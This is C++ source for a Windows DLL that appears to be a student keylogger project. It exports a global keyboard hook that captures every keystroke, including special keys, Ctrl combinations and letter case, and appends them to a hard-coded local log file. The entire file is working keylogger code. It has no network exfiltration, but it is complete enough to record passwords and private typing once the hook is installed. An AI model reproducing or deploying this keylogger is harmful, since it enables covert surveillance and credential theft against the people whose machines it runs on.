#include "pch.h"
#include <Windows.h>
#include <string>
#include <fstream>
using namespace std;

HHOOK hGlobalHook = NULL;
ofstream file;

void WriteKeyLogToFile(string str);

string path = "F:\\k1-21-22\\DACSNM\\HDH\\log\\log.txt";

extern "C" __declspec(dllexport) LRESULT LogKeyboard(int nCode, WPARAM wParam, LPARAM lParam, int t0)
{
	if (nCode == HC_ACTION && wParam == WM_KEYDOWN)
	{
		WORD w;

		bool isShift = ((GetKeyState(VK_SHIFT) & 0x80) == 0x80 ? true : false);
		bool isCapslock = (GetKeyState(VK_CAPITAL) != 0 ? true : false);
		bool isCtrl = ((GetKeyState(VK_CONTROL) & 0x80) == 0x80 ? true : false);

		BYTE keyState[256];
		GetKeyboardState(keyState);

		KBDLLHOOKSTRUCT* keycode = (KBDLLHOOKSTRUCT*)lParam;

		if (keycode->vkCode == VK_BACK)
			WriteKeyLogToFile("{Key.BACKSPACE}");
		if (keycode->vkCode == VK_DELETE)
			WriteKeyLogToFile("{Key.DELETE}");
		if (keycode->vkCode == VK_RETURN)
			WriteKeyLogToFile("{Key.ENTER}");
		if (keycode->vkCode == VK_HOME)
			WriteKeyLogToFile("{Key.HOME}");
		if (keycode->vkCode == VK_END)
			WriteKeyLogToFile("{Key.END}");
		if (keycode->vkCode == VK_LEFT)
			WriteKeyLogToFile("{Key.LEFT}");
		if (keycode->vkCode == VK_RIGHT)
			WriteKeyLogToFile("{Key.RIGHT}");
		if (keycode->vkCode == VK_DOWN)
			WriteKeyLogToFile("{Key.DOWN}");
		if (keycode->vkCode == VK_UP)
			WriteKeyLogToFile("{Key.UP}");
		if (keycode->vkCode == VK_INSERT)
			WriteKeyLogToFile("{Key.INSERT}");
		if (keycode->vkCode == VK_LSHIFT)
			WriteKeyLogToFile("{Key.LEFTSHIFT}");
		if (keycode->vkCode == VK_RSHIFT)
			WriteKeyLogToFile("{Key.RIGHTSHIFT}");
		if (keycode->vkCode == VK_F1)
			WriteKeyLogToFile("{Key.F1}");
		if (keycode->vkCode == VK_F2)
			WriteKeyLogToFile("{Key.F2}");
		if (keycode->vkCode == VK_F3)
			WriteKeyLogToFile("{Key.F3}");
		if (keycode->vkCode == VK_F4)
			WriteKeyLogToFile("{Key.F4}");
		if (keycode->vkCode == VK_F5)
			WriteKeyLogToFile("{Key.F5}");
		if (keycode->vkCode == VK_F6)
			WriteKeyLogToFile("{Key.F6}");
		if (keycode->vkCode == VK_F7)
			WriteKeyLogToFile("{Key.F7}");
		if (keycode->vkCode == VK_F8)
			WriteKeyLogToFile("{Key.F8}");
		if (keycode->vkCode == VK_F9)
			WriteKeyLogToFile("{Key.F9}");
		if (keycode->vkCode == VK_F10)
			WriteKeyLogToFile("{Key.F10}");
		if (keycode->vkCode == VK_F11)
			WriteKeyLogToFile("{Key.F11}");
		if (keycode->vkCode == VK_F12)
			WriteKeyLogToFile("{Key.F12}");
		if (keycode->vkCode == VK_CAPITAL)
			WriteKeyLogToFile("{Key.CAPSLOCK}");

		if (ToAscii(keycode->vkCode, keycode->scanCode, keyState, &w, keycode->flags) == 1)
		{
			char key = char(w);
			if ((isCapslock ^ isShift) && ((key >= 65 && key <= 90) || (key >= 97 && key <= 122)))
			{
				key = toupper(key);
			}

			if (isCtrl)
			{
				char str[30];
				sprintf_s(str, "{Ctrl - %c}", (char)keycode->vkCode);
				WriteKeyLogToFile(str);
			}
			else
			{
				char str[30];
				sprintf_s(str, "%c", key);
				WriteKeyLogToFile(str);
			}
		}
	}
	return CallNextHookEx(hGlobalHook, nCode, wParam, lParam);
}

extern "C" __declspec (dllexport) void SetGlobalHook(HHOOK hHook) {
	hGlobalHook = hHook;
}

void WriteKeyLogToFile(string str) {
	file.open(path, ios_base::app);
	file << str;
	file.close();
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

